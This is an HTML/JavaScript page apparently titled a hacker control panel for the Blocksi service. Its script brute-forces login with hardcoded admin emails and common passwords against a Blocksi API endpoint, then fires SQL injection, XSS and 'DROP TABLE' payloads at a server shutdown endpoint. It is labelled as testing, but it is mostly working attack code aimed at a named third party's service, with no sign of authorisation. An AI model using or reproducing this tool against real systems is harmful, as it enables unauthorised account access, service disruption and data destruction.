<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BLocksi-Hacker Control Panel</title>
  <style>
    body { font-family: Arial, sans-serif; background: #fafafa; }
    .container { max-width: 700px; margin: 40px auto; background: #fff; padding: 2em; border-radius: 8px; box-shadow: 0 0 10px #eee;}
    h1 { color: #2d3748;}
    button { margin: 10px 0; padding: 10px 20px; font-size: 16px;}
    pre { background: #f6f8fa; padding: 1em; border-radius: 6px;}
    .note { background: #fffae6; border-left: 4px solid #ffe066; padding: 1em; margin: 1em 0;}
    .section-label { font-weight: bold; margin-top: 1em; margin-bottom: 0.2em; display: block;}
    #output { min-height: 100px; margin-top: 15px; }
    input[type="text"] { font-size: 16px; padding: 6px; width: 350px; }
    .published-url { margin: 1em 0; font-size: 1.1em; }
  </style>
</head>
<body>
  <div class="container">
    <h1>BLocksi-Hacker Web Control Panel</h1>
    <div class="published-url">
      <strong>Published Site:</strong>
      <a href="https://r3s3t666.github.io/BLocksi-Hacker/" target="_blank">https://r3s3t666.github.io/BLocksi-Hacker/</a>
    </div>
    <div class="note">
      <strong>Note:</strong> All tests run from your browser. No downloads or installation needed. Make sure your API endpoint is accessible from a browser (CORS must be enabled).
    </div>
    <label for="apiBase"><b>API Base URL:</b></label>
    <input type="text" id="apiBase" value="https://test.blocksi.com/api" size="40">
    <br><br>
    <span class="section-label">Step 1: Brute Force Login Test</span>
    <button onclick="bruteForceLogin()">Run Brute Force Login</button>
    <span style="color:#888; font-size:13px; display:block; margin-bottom:1em;">Attempts multiple username/password combinations to test login security.</span>

    <span class="section-label">Step 2: Fuzz Vulnerability Test</span>
    <button onclick="fuzzEndpoint()">Run Fuzz Endpoint Test</button>
    <span style="color:#888; font-size:13px; display:block; margin-bottom:1em;">Sends typical attack payloads to the shutdown endpoint to check input validation.</span>

    <pre id="output"></pre>
  </div>
  <script>
    const USERS = ['admin@blocksi.com', 'user@blocksi.com'];
    const PASSWORDS = ['123456', 'admin', 'password', 'letmein'];
    const FUZZ_DATA = [
      { serverId: "' OR '1'='1" },
      { serverId: "<script>alert(1)</script>" },
      { serverId: "1; DROP TABLE servers;" }
    ];
    const output = document.getElementById('output');

    function log(msg) {
      output.textContent += msg + '\n';
    }

    async function bruteForceLogin() {
      output.textContent = 'Starting brute force login...\n';
      const apiBase = document.getElementById('apiBase').value;
      for (const email of USERS) {
        for (const password of PASSWORDS) {
          try {
            const res = await fetch(apiBase + '/auth/login', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email, password })
            });
            let data = await res.json();
            if (data.accessToken) {
              log(`✅ Potential valid login: ${email}:${password}`);
            } else {
              log(`❌ Attempt failed for ${email}:${password}: ${res.status}`);
            }
          } catch (err) {
            log(`❌ Network error for ${email}:${password}: ${err}`);
          }
        }
      }
      log('Brute force login complete.');
    }

    async function fuzzEndpoint() {
      output.textContent = 'Starting input fuzzing...\n';
      const apiBase = document.getElementById('apiBase').value;
      for (const data of FUZZ_DATA) {
        try {
          const res = await fetch(apiBase + '/servers/shutdown', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          });
          log(`Fuzz input ${JSON.stringify(data)}: ${res.status}`);
        } catch (err) {
          log(`Fuzz input failed: ${JSON.stringify(data)} - ${err}`);
        }
      }
      log('Fuzzing complete.');
    }
  </script>
</body>
</html>